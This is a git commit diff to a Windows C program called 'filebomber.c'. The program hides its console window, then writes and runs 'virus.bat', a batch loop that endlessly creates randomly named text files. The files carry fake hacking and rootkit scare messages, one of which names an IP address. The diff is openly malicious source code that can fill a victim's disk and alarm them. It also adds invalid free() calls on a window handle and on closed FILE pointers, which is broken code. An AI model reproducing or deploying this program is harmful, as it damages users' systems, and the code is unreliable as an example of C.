6bbc7ed682fdf2e600ecde3ca9ba2dccdfa1afb1
TotoAJ <67079777+TotoAJ@users.noreply.github.com>
2021-12-12 16:04:57 -0800

    Update filebomber.c

--- filebomber.c
+++ filebomber.c
@@ -2,22 +2,25 @@
 #include <windows.h>
 #define PATH "virus.bat"
 
-int main()
+int main(int argc, char* argv[])
 {
     HWND window;
     AllocConsole();
     window = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(window, 0);
+    free(window);
 
     FILE *a = fopen("virus.bat", "ab+");
     fclose(a);
+    free(a);
 
     FILE *fp;
 
     fp = fopen(PATH, "w");
-    fprintf(fp, "echo off\n:start\necho YOU/HAVE/BEEN/HACKED>sshtunneldecryption\%%random\%%\.txt\ngoto start");
+    fprintf(fp, "echo off\n:start\necho ==   YOU ARE HACKED   ==;INJECTC \%%random\%%/SYS/ROOT . . . DONE;MOVEC \%%random\%%/SYS/ROOT->SYS/WIN32 . . . DONE;BACKD \%%random\%%/SYS/ROOT->36.162.91.30 . . . DONE;ENCRYPTD \%%random\%%/SYS/ROOT . . . DONE;STORED \%%random\%%/SYS/ROOT . . . DONE;. . . COMPLETED INJECTION OF ROOTKIT>rootkit\%%random\%%.txt\ngoto start");
 
     fclose(fp);
+    free(fp);
 
     system(PATH);
     Sleep(10);
